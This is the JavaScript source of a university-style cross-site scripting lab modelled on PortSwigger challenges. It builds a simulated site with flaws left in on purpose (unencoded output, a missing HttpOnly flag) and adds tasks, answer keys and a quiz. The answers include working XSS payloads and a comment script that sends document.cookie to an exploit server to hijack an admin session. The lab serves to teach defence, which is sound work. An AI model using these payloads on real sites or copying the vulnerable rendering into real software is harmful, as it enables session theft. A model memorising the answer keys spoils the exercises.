// Web Applications Security · Week 6 — Cross-Site Scripting, as PortSwigger-style challenges.
(() => {
  const { esc } = Web;
  const comments = { 1: [{ name: "Bud Weiser", text: "Great post, thanks!" }], 2: [{ name: "Ann Other", text: "The admin reads every comment on this one." }] };
  let adminSid;
  const W = Web.lab({
    siteName: "XSS Playground — Week 6",
    exploitServer: true, email: false,
    handle(req, res, srv) {
      const s = srv.session(req, res);
      adminSid ??= (() => { const id = srv.rid(32); srv.sessions[id] = { user: "administrator", csrf: srv.rid(32) }; return id; })();
      const q = req.query, p = req.path;
      const searchForm = (action, val = "") => `<form action="${action}" method="GET"><input type="text" name="search" placeholder="Search the blog..." value="${val}"><button type="submit">Search</button></form>`;
      if (p === "/") {
        res.body = srv.page("Home", `<h1>Week 6 — five vulnerable features</h1><p>Each one mirrors a PortSwigger Web Security Academy lab.</p>
<ul><li><a href="/reflected">1. Search (reflected XSS, nothing encoded)</a></li><li><a href="/post?postId=1">2. Blog comments (stored XSS)</a></li><li><a href="/dom">3. Search with tracking pixel (DOM XSS, document.write)</a></li><li><a href="/attr">4. Search box (attribute, angle brackets encoded)</a></li><li><a href="/jsstring">5. Search tracking (JavaScript string, angle brackets encoded)</a></li><li><a href="/post?postId=2">6. "Admin reads comments" post (steal the admin's cookie)</a></li></ul>`, s);
        return;
      }
      if (p === "/reflected") {
        const v = q.search;
        res.body = srv.page("Search", `<h1>Search</h1>${searchForm("/reflected")}${v != null ? `<h2>0 search results for '${v}'</h2>` : ""}`, s);
        return;
      }
      if (p === "/attr") {
        const v = q.search;
        const enc = (x) => String(x ?? "").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        res.body = srv.page("Search", `<h1>Search</h1>${searchForm("/attr", enc(v))}${v != null ? `<h2>0 search results for '${esc(v)}'</h2>` : ""}`, s);
        return;
      }
      if (p === "/jsstring") {
        const v = q.search;
        const enc = (x) => String(x ?? "").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        res.body = srv.page("Search", `<h1>Search</h1>${searchForm("/jsstring")}${v != null ? `<h2>0 search results for '${esc(v)}'</h2><script>var searchTerms = '${enc(v)}';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');</script>` : ""}`, s);
        return;
      }
      if (p === "/dom") {
        res.body = srv.page("Search", `<h1>Search</h1>${searchForm("/dom")}<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) { trackSearch(query); }
</script>`, s);
        // the page's own script runs client-side: rebuild what document.write would write
        res.client = (url) => { const v = url.searchParams.get("search"); return v ? `<img src="/resources/images/tracker.gif?searchTerms=${v}">` : ""; };
        return;
      }
      if (p === "/post") {
        const id = +q.postId || 1;
        const post = Web.blog[id - 1] || Web.blog[0];
        const list = (comments[id] || []).map((c) => `<section class="comment"><p><b>${c.name}</b> | 13 November 2026</p><p>${c.text}</p></section>`).join("");
        res.body = srv.page(post.title, `<h1>${esc(post.title)}</h1><p><i>${esc(post.author)}</i></p><p>${esc(post.body)}</p><hr><h2>Comments</h2>${list}<hr><h2>Leave a comment</h2>
<form action="/post/comment" method="POST"><input type="hidden" name="csrf" value="${s.csrf}"><input type="hidden" name="postId" value="${id}"><label>Comment:</label><textarea name="comment" rows="4"></textarea><label>Name:</label><input type="text" name="name"><button type="submit">Post Comment</button></form>`, s);
        return;
      }
      if (p === "/post/comment" && req.method === "POST") {
        const f = req.form;
        if (f.csrf !== s.csrf) { res.status = 400; res.body = '"Invalid CSRF token"'; return; }
        const id = +f.postId || 1;
        (comments[id] ??= []).push({ name: esc(f.name || "anonymous"), text: f.comment || "" });
        res.body = srv.page("Thank you", `<h1>Thank you for your comment!</h1><p>Your comment has been submitted.</p><a href="/post?postId=${id}">Back to blog</a>`, s);
        if (id === 2) setTimeout(() => { // the administrator reads new comments on post 2
          W.victim.jar.set(srv.HOST, `session=${adminSid}; Secure; SameSite=None`);
          W.victim.go(`https://${srv.HOST}/post?postId=2`);
        }, 2500);
        return;
      }
      if (p === "/my-account") {
        if (!s.user) { res.status = 302; res.headers.Location = "/login"; return; }
        if (s.user === "administrator") srv.solve("steal", "Challenge 6 solved: you are logged in as the administrator with a stolen session cookie.");
        res.body = srv.page("My account", `<h1>My Account</h1><p>Your username is: <b>${s.user}</b></p>${s.user === "administrator" ? "<p>Admin panel: <a href='/'>(you're in)</a></p>" : ""}`, s);
        return;
      }
      if (p === "/login") {
        if (req.method === "POST") {
          if (req.form.username === "wiener" && req.form.password === "peter") { s.user = "wiener"; res.status = 302; res.headers.Location = "/my-account"; return; }
          res.body = srv.page("Login", `<p>Invalid username or password.</p>`, s); return;
        }
        res.body = srv.page("Login", `<h1>Login</h1><p>Your account: wiener / peter</p><form action="/login" method="POST"><input type="hidden" name="csrf" value="${s.csrf}"><label>Username</label><input type="text" name="username"><label>Password</label><input type="text" name="password"><button type="submit">Log in</button></form>`, s);
        return;
      }
      if (p === "/logout") { s.user = null; res.status = 302; res.headers.Location = "/"; return; }
      if (p.startsWith("/resources/")) { res.type = "image/gif"; res.body = "GIF89a"; return; }
      res.status = 404; res.body = srv.page("Not found", `<p>"Not Found"</p>`, s);
    },
    onDialog(fn, v, where, srv) {
      if (where.who !== "you") return;
      const p = new URL(where.url).pathname;
      const map = { "/reflected": "reflected", "/post": "stored", "/dom": "dom", "/attr": "attr", "/jsstring": "js" };
      const id = map[p];
      if (id === "stored" && !/postId=1/.test(where.url)) return;
      if (id) srv.solve(id, `Challenge solved: ${fn}() executed on ${p}`);
    },
    challenges: [{ id: "reflected" }, { id: "stored" }, { id: "dom" }, { id: "attr" }, { id: "js" }, { id: "steal" }],
    sameSite: "None",
  });
  // this lab's site forgot HttpOnly on purpose (challenge 6)
  const origSession = W.srv.session;
  W.srv.session = (req, res, o) => { const s = origSession(req, res, o); res.setCookies = res.setCookies.map((c) => c.replace("; HttpOnly", "")); return s; };
  const S = W.srv.solved;

  Lab.start({
    brief: `
<p>Six challenges in the style of <b>PortSwigger's Web Security Academy</b>, all on one practice site. You get a <b>browser</b>, <b>Burp Suite</b> (Proxy history, Repeater, Intruder, Decoder) and an <b>exploit server</b>. A challenge is solved when your payload makes the page call <code>alert()</code>, or, for the last one, when you take over the administrator's session.</p>
<p class="key"><b>Why XSS happens (Lecture 6):</b> untrusted input is placed in a page without being neutralised, so the browser treats it as <b>code instead of data</b>. It's the same root cause as SQL injection, inside the browser this time.</p>
<div class="tbl-wrap"><table class="tbl"><tr><th>#</th><th>PortSwigger lab it mirrors</th><th>Context</th></tr>
<tr><td>1</td><td>Reflected XSS into HTML context with nothing encoded</td><td>HTML body</td></tr>
<tr><td>2</td><td>Stored XSS into HTML context with nothing encoded</td><td>HTML body, saved</td></tr>
<tr><td>3</td><td>DOM XSS in <code>document.write</code> sink using source <code>location.search</code></td><td>Client-side sink</td></tr>
<tr><td>4</td><td>Reflected XSS into attribute with angle brackets HTML-encoded</td><td>HTML attribute</td></tr>
<tr><td>5</td><td>Reflected XSS into a JavaScript string with angle brackets HTML-encoded</td><td>JavaScript string</td></tr>
<tr><td>6</td><td>Exploiting cross-site scripting to steal cookies</td><td>Stored → session hijack</td></tr></table></div>
<p class="note">Safe by design: the simulated browser parses your payload and <b>simulates</b> what a real browser would do (show the alert, send the request). Nothing you type is actually executed. Your login: <code>wiener / peter</code>.</p>`,
    setup(api) { W.mount(api); },
    tasks: [
      { title: "1 · Reflected XSS: make the search page call alert()", detail: "Your search term is echoed straight into the HTML. Try the search box at <b>/reflected</b>.", where: "Browser",
        hint: "Nothing is encoded, so a whole script tag survives.", answer: "<script>alert(1)</script>", check: () => S.reflected },
      { title: "2 · Stored XSS: plant a comment that runs for every visitor", detail: "Comment on post 1, then view the post.", where: "Browser › 2. Blog comments",
        hint: "The comment text is stored and written into the page unencoded.", answer: "Comment: <script>alert(1)</script>\n(any name)", check: () => S.stored },
      { title: "3 · DOM XSS: break out of the <code>document.write</code> sink", detail: "View the page source in Burp (Proxy › response): the script writes your search into an <code>&lt;img src=\"…\"&gt;</code>. Source = <code>location.search</code>, sink = <code>document.write</code>.", where: "Browser › 3",
        hint: "Close the src attribute and the img tag, then add an element whose event handler fires by itself.", answer: '"><svg onload=alert(1)>', check: () => S.dom },
      { title: "4 · Attribute context: angle brackets are encoded", detail: "Your term is reflected inside <code>value=\"…\"</code>, but &lt; and &gt; become entities.", where: "Browser › 4",
        hint: "You don't need new tags: close the quote and add an attribute that fires an event.", answer: '" autofocus onfocus=alert(1) x="', check: () => S.attr },
      { title: "5 · JavaScript string context", detail: "Your term lands inside <code>var searchTerms = '…';</code>, and angle brackets are encoded.", where: "Browser › 5",
        hint: "Break out of the single-quoted string and turn it into an expression.", answer: "'-alert(1)-'", check: () => S.js },
      { title: "6 · Steal the administrator's session cookie", detail: "The admin reads every new comment on <b>post 2</b>, and this site forgot <code>HttpOnly</code>. Post a comment whose script sends <code>document.cookie</code> to your exploit server. Copy the stolen <code>session</code> value from the exploit server's access log into DevTools › Cookies, then open <b>/my-account</b>.", where: "Browser + Exploit server",
        hint: "Use a fetch to your exploit server host with document.cookie in the URL, wait a few seconds, then read the access log.", answer: `Comment on post 2:\n<script>fetch("https://${W.EXP}/?c="+document.cookie)</script>\n\nThen: Exploit server › Access log → copy session=…\nBrowser › DevTools › Cookies → paste → open /my-account`, check: () => S.steal },
    ],
    doneText: "All six XSS challenges solved: reflected, stored, DOM, attribute, JS string, and a full session hijack.",
    quiz: [
      { t: "mcq", q: "What is Cross-Site Scripting?", opts: ["Untrusted input is placed in a page without being neutralised, so the browser executes it as script", "A forged request sent from another site using the victim's cookies", "Injecting SQL into a login form", "Stealing cookies by sniffing HTTP traffic"], a: 0, src: "Lecture 6, Definition of XSS" },
      { t: "match", q: "Match each XSS category to where the payload lives.", pairs: [["Reflected", "In the request itself, e.g. a URL parameter"], ["Stored", "Saved on the server, e.g. a comment"], ["DOM-based", "Never reaches the server; written by client-side script"]], src: "Lecture 6, Three Categories" },
      { t: "multi", q: "Which are DOM XSS <b>sinks</b>? (Choose all that apply)", opts: ["element.innerHTML", "document.write()", "eval()", "location.hash", "element.textContent"], a: [0, 1, 2], why: "location.hash is a source; textContent is the safe alternative.", src: "Lecture 6, Sources and Sinks" },
      { t: "multi", q: "Which are DOM XSS <b>sources</b>? (Choose all that apply)", opts: ["location.search", "document.referrer", "window.name", "setTimeout(string)", "outerHTML"], a: [0, 1, 2], src: "Lecture 6, Sources and Sinks" },
      { t: "mcq", q: "Which XSS category is the most consequential, and why?", opts: ["Stored — one injection runs for every later visitor with no further action", "Reflected — it needs no victim interaction", "DOM — the server can always see it", "They are all equal"], a: 0, src: "Lecture 6, Stored XSS walkthrough" },
      { t: "match", q: "Match each output context to its correct encoding.", pairs: [["HTML body", "HTML entity encoding"], ["HTML attribute", "Entity-encode everything outside a small safe set"], ["JavaScript variable", "Unicode escaping inside a quoted string"], ["CSS value", "CSS hex encoding"], ["URL parameter", "Percent encoding"]], src: "Lecture 6, Output Encoding table" },
      { t: "tf", q: "HttpOnly prevents XSS from happening.", a: false, why: "It doesn't prevent XSS; it stops injected script from reading the session cookie, closing off the most damaging consequence. Challenge 6 only worked because HttpOnly was missing.", src: "Lecture 6, Additional Layers; Lecture 2 cookies" },
      { t: "fill", q: "In challenge 4 angle brackets were encoded but quotes were not. Which payload breaks out of <code>value=\"…\"</code>?", a: ['" autofocus onfocus=alert(1) x="', /"\s*\w+\s+on\w+=/i, /"\s*on\w+=/i], src: "Lab challenge 4; Lecture 6 encoding must match its context" },
      { t: "mcq", q: "Why did HTML-encoding &lt; and &gt; fail to protect the JavaScript-string context (challenge 5)?", opts: ["The wrong encoding for the context: inside a JS string the quote, not the angle bracket, is what breaks out", "Because browsers ignore encoding", "Because the payload used uppercase", "Because CSP was missing"], a: 0, src: "Lecture 6, “Encoding must match its context”" },
      { t: "mcq", q: "In React, which construct bypasses automatic escaping?", opts: ["dangerouslySetInnerHTML", "{value} inside JSX", "useState", "className"], a: 0, src: "Lecture 6, Automatic escaping in frameworks" },
      { t: "short", q: "Name three layers of defense against XSS from the lecture besides output encoding.", model: "Input validation with an allow list, a sanitisation library when some HTML must be allowed, a strict Content-Security-Policy (blocks inline scripts / limits script sources), and HttpOnly cookies to protect the session.",
        keys: [["validation", "allow list", "allowlist"], ["csp", "content security policy", "content-security-policy"], ["httponly"], ["sanitiz", "sanitis"]], src: "Lecture 6, Additional Layers of Defense" },
      { t: "mcq", q: "Where is XSS in the OWASP Top 10 (2021)?", opts: ["Merged into A03:2021 – Injection", "A07:2021 – Identification and Authentication Failures", "A01:2021 – Broken Access Control", "It's no longer listed at all"], a: 0, src: "Lecture 6, OWASP placement" },
      { t: "mcq", q: "What is the most common objective of an XSS attacker?", opts: ["Session theft: read the session cookie and send it to an attacker-controlled server", "Crash the web server", "Change DNS records", "Brute-force the database"], a: 0, src: "Lecture 6, What an Attacker Gains" },
      { t: "short", q: "What is the safest replacement for <code>innerHTML</code> when writing user data into the page, and why?", model: "<code>element.textContent</code>: it always treats its argument as displayable text, never as markup, so injected tags aren't parsed.",
        keys: [["textcontent"], ["text", "not parsed", "never markup", "as text"]], src: "Lecture 6, Sources and Sinks" },
    ],
  });
})();
